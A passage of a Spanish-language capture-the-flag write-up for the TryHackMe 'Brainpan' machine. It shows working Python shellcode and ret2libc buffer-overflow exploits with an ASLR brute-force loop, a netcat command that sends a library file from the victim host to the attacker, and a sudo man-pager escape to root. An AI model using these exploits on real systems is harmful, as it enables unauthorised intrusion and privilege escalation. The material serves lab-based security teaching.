<p class="plain-text">Agregamos un <a href="https://www.exploit-db.com/shellcodes/13628">shellcode</a> en arquitectura x86 ya que estamos en 32 bits el cual nos ejecutara una <code class="language-plaintext highlighter-rouge">/bin/sh</code> al script y rellenamos con <code class="language-plaintext highlighter-rouge">A</code> hasta llegar al registro <code class="language-plaintext highlighter-rouge">EIP</code>, en el volveremos con la dirección de <code class="language-plaintext highlighter-rouge">CALL EAX</code> y asi se ejecutara el shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="o">import </span><span class="p">struct

p32 </span><span class="o">= lambda </span><span class="am">addr</span><span class="p">: struct.pack(</span><span class="s">"I"</span><span class="p">, addr)

offset </span><span class="o">= </span><span class="mi">116
</span><span class="p">
calleax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x080484af</span><span class="p">)

shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">"</span><span class="p">  

junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="p"> (offset </span><span class="o">-</span><span class="no"> len</span><span class="p">(shellcode))

</span><span class="no">print</span><span class="p">(shellcode </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">calleax)</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro payload sera el siguiente, iniciamos por un shellcode en x86 que ejecute una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, despues rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al <code class="language-plaintext highlighter-rouge">RIP</code> y hacemos que este apunte a la direccion de la intrucción <code class="language-plaintext highlighter-rouge">call eax</code>, esta instruccion interpretara el registro <code class="language-plaintext highlighter-rouge">eax</code> donde esta el inicio de nuestro <code class="language-plaintext highlighter-rouge">input</code> y ejecutara nuestro <code class="language-plaintext highlighter-rouge">shellcode</code></p>
<a href="/tryhackme/brainpan/16.png" target="_blank"><div><p><img src="/tryhackme/brainpan/16.png"></p></div></a>

<p class="plain-text">Ejecutamos el binario <code class="language-plaintext highlighter-rouge">validate</code> en la máquina victima con el exploit ejecutado como <code class="language-plaintext highlighter-rouge">validate</code>, al hacerlo conseguimos una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario <code class="language-plaintext highlighter-rouge">anansi</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate $(python2 exploit.py)  
$ whoami
anansi
$ hostname -I
10.10.27.47
$</span>
</code></pre></div></div><br>

<p class="plain-text">Otro metodo es explotarlo mediante un <code class="language-plaintext highlighter-rouge">ret2libc</code>, para esto necesitamos saber la libreria que usa el binario que en este caso con <code class="language-plaintext highlighter-rouge">ldd</code> vemos que es <code class="language-plaintext highlighter-rouge">libc.so.6</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate  
	linux-gate.so.1 =>  (0xb77d5000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7621000)  
	/lib/ld-linux.so.2 (0xb77d6000)
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Descargamos el archivo <code class="language-plaintext highlighter-rouge">libc.so.6</code> con <code class="language-plaintext highlighter-rouge">netcat</code> de la misma manera que antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 10.8.64.87 4444 < /lib/i386-linux-gnu/libc.so.6  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat</span><span class="p"> -lvnp 4444 > libc.so.6  
Listening on 0.0.0.0 4444
Connection received on 10.10.27.47  </span>
</code></pre></div></div><br>

<p class="plain-text">Para empezar tomaremos como <code class="language-plaintext highlighter-rouge">base</code> una dirección de <code class="language-plaintext highlighter-rouge">libc</code> usando <code class="language-plaintext highlighter-rouge">ldd</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate
        linux-gate.so.1 =>  (0xb7719000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7565000)  
        /lib/ld-linux.so.2 (0xb771a000)
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">readelf</code> conseguimos <code class="language-plaintext highlighter-rouge">offsets</code> de las direcciones para <code class="language-plaintext highlighter-rouge">exit</code> y <code class="language-plaintext highlighter-rouge">system</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ readelf</span><span class="p"> -s libc.so.6 | </span><span class="ve">grep</span><span class="p"> -E </span><span class="am">" system@@| exit@@"</span><span class="p">
   136: 00032fb0    45 FUNC    GLOBAL DEFAULT   12 </span><span class="ro">exit@@</span><span class="p">GLIBC_2.0
  1422: 0003f430   141 FUNC    WEAK   DEFAULT   12 </span><span class="ro">system@@</span><span class="p">GLIBC_2.0  </span>
</code></pre></div></div><br>

<p class="plain-text">Para conseguir un <code class="language-plaintext highlighter-rouge">offset</code> de la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> podemos usar <code class="language-plaintext highlighter-rouge">strings</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ strings </span><span class="p">-a -t x libc.so.6 | </span><span class="ve">grep</span><span class="p"> /bin/sh  
 160f58 </span><span class="ro">/bin/sh</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos las 3 direcciones necesitadas para <code class="language-plaintext highlighter-rouge">ret2libc</code>: <code class="language-plaintext highlighter-rouge">system</code> <code class="language-plaintext highlighter-rouge">exit</code> y <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">system </span><span class="o">= </span><span class="mi">0x0003f430  
</span><span class="p">bin_sh </span><span class="o">= </span><span class="mi">0x00160f58  
</span><span class="p">exit </span><span class="o">= </span><span class="mi">0x00032fb0  </span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo estas direcciones son solo <code class="language-plaintext highlighter-rouge">offsets</code>, para conseguir la direccion real necesitamos sumarle la dirección de <code class="language-plaintext highlighter-rouge">libc base</code> que tenemos de antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">libc_base </span><span class="o">= </span><span class="mi">0xb7565000</span><span class="p">

system </span><span class="o">= </span><span class="p">p32(libc_base </span><span class="o">+ </span><span class="mi">0x0003f430</span><span class="p">)  
bin_sh </span><span class="o">= </span><span class="p">p32(libc_base </span><span class="o">+ </span><span class="mi">0x00160f58</span><span class="p">)  
exit </span><span class="o">= </span><span class="p">p32(libc_base </span><span class="o">+ </span><span class="mi">0x00032fb0</span><span class="p">)  </span>
</code></pre></div></div><br>

<p class="plain-text">Plasmamos el <code class="language-plaintext highlighter-rouge">junk</code> y las <code class="language-plaintext highlighter-rouge">direcciones</code> en un script de python y las printeamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="o">import </span><span class="p">struct

p32 </span><span class="o">= lambda </span><span class="am">addr</span><span class="p">: struct.pack(</span><span class="s">"I"</span><span class="p">, addr)  

offset </span><span class="o">= </span><span class="mi">116</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

libc_base </span><span class="o">= </span><span class="mi">0xb7565000</span><span class="p">

system </span><span class="o">= </span><span class="p">p32(libc_base </span><span class="o">+ </span><span class="mi">0x0003f430</span><span class="p">)
bin_sh </span><span class="o">= </span><span class="p">p32(libc_base </span><span class="o">+ </span><span class="mi">0x00160f58</span><span class="p">)
exit </span><span class="o">= </span><span class="p">p32(libc_base </span><span class="o">+ </span><span class="mi">0x00032fb0</span><span class="p">)

</span><span class="no">print</span><span class="p">(junk </span><span class="o">+ </span><span class="p">system </span><span class="o">+ </span><span class="p">exit </span><span class="o">+ </span><span class="p">bin_sh)</span>
</code></pre></div></div><br>

<p class="plain-text">De esta manera en el <code class="language-plaintext highlighter-rouge">EIP</code> ejecutariamos <code class="language-plaintext highlighter-rouge">system()</code> como función, <code class="language-plaintext highlighter-rouge">exit()</code> como función de <code class="language-plaintext highlighter-rouge">retorno</code> y le pasaremos la string <code class="language-plaintext highlighter-rouge">/bin/sh</code> como <code class="language-plaintext highlighter-rouge">argumento</code> a system()</p>
<a href="/tryhackme/brainpan/17.png" target="_blank"><div><p><img src="/tryhackme/brainpan/17.png"></p></div></a>

<p class="plain-text">Sin embargo tenemos un problema y es que la dirección de <code class="language-plaintext highlighter-rouge">libc base</code> cambia constantemente, esto es porque el <code class="language-plaintext highlighter-rouge">ASLR</code> esta activado y hay aleatorizacion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate 
    linux-gate.so.1 =>  (0xb77ce000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb761a000)  
    /lib/ld-linux.so.2 (0xb77cf000)
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /proc/sys/kernel/randomize_va_space
2
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo en <code class="language-plaintext highlighter-rouge">x86</code> las direcciones son tan <code class="language-plaintext highlighter-rouge">pequeñas</code> que despues de ejecutar el binario varias veces la dirección de libc <code class="language-plaintext highlighter-rouge">base</code> vuelve a <code class="language-plaintext highlighter-rouge">coincidir</code> varias veces</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ for i in $(seq 1 1000); do ldd /usr/local/bin/validate | grep 0xb7565000; done  
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Asi que es caso de ejecutarlo en <code class="language-plaintext highlighter-rouge">bucle</code> hasta que consigamos una sh como <code class="language-plaintext highlighter-rouge">anansi</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ while true; do validate $(python2 exploit.py); done  
Segmentation fault
Segmentation fault
Segmentation fault
$ whoami
anansi
$ hostname -I
10.10.27.47
$</span>
</code></pre></div></div><br>
</section>

</section>

<section class="post" id="shell-root">
<br><h3 class="post-title">Shell - root</h3><br>

<p class="plain-text">A nivel de <code class="language-plaintext highlighter-rouge">sudoers</code> podemos ejecutar como <code class="language-plaintext highlighter-rouge">root</code> sin contraseña <code class="language-plaintext highlighter-rouge">anansi_util</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">$ sudo -l
Matching Defaults entries for anansi on this host:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
$</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos varias opciones entre ellas <code class="language-plaintext highlighter-rouge">manual</code>, podemos desplegar el manual del comando <code class="language-plaintext highlighter-rouge">whoami</code> y entra en un modo <code class="language-plaintext highlighter-rouge">paginate</code>, ejecutamos <code class="language-plaintext highlighter-rouge">!bash</code> y somos root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">$ sudo /home/anansi/bin/anansi_util manual whoami

NAME
       whoami - print effective userid

SYNOPSIS
       whoami [OPTION]...

DESCRIPTION
       Print the user name associated with the current effective user ID  

       --help display this help and exit

       --version
              output version information and exit

AUTHOR
       Written by Richard Mlynarik.

!bash

</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># hostname -I
10.10.27.47
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># cat /root/b.txt 

_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com  

</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p">#</span>
</code></pre></div></div><br>

<p class="plain-text">Es necesario mencionar que el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> de la escalada es opcional ya que a nivel de sudoers de <code class="language-plaintext highlighter-rouge">puck</code> tenemos el binario <code class="language-plaintext highlighter-rouge">anansi_util</code> que teniamos antes, asi que solo repetimos el proceso y conseguimos una shell como el usuario <code class="language-plaintext highlighter-rouge">root</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -l
Matching Defaults entries for puck on this host:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /home/anansi/bin/anansi_util manual whoami

NAME
       whoami - print effective userid

SYNOPSIS
       whoami [OPTION]...

DESCRIPTION
       Print the user name associated with the current effective user ID  

       --help display this help and exit

       --version
              output version information and exit

AUTHOR
       Written by Richard Mlynarik.

!bash

</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># hostname -I
10.10.27.47
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p"># cat /root/b.txt 

_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com  

</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">/usr/share/man</span><span class="p">#</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - DarthBear</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
